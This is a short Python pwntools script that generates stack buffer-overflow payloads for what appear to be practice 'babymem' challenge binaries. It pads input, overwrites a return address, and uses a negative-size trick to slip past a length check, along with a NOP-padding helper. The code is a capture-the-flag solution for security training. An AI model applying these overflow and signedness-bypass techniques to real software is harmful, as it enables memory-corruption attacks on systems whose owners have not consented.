#!/usr/bin/env python

from pwn import *

def hex2fmt_str(hex_number):
    byte_length = (hex_number.bit_length() + 7) // 8  # Calculate the number of bytes needed
    byte_string = hex_number.to_bytes(byte_length, byteorder='little')  # Convert to bytes in little-endian order
    formatted_string = ''.join(['\\x{:02x}'.format(byte) for byte in byte_string])
    return formatted_string

def fast_payload_gen(pre_len, value, challenge, pad_char = 'a', prefix = '', sign_mix = False):
    fmt_str = hex2fmt_str(value)
    val_len = len(fmt_str) // 4
    command = 'printf "' + str(pre_len + val_len) + '\\n'
    if(sign_mix == True):
        command = 'printf "' + '\\x2d1' + '\\n'
    start_index = 0
    if(prefix != ''):
        start_index += 1
        command = command + prefix
    for i in range(start_index, pre_len):
        command = command + pad_char
    print(command + fmt_str + '" | /challenge/' + challenge)

def bytes_padding(len):
    byte_str = b''
    for i in range(len):
        byte_str = byte_str + b'\x90'
    return byte_str

def babymem_4_0():
    fast_payload_gen(88, 0x4024bc, 'babymem_level4.0', sign_mix = True)

def babymem_4_1():
    fast_payload_gen(72, 0x401b01, 'babymem_level4.1', sign_mix = True)
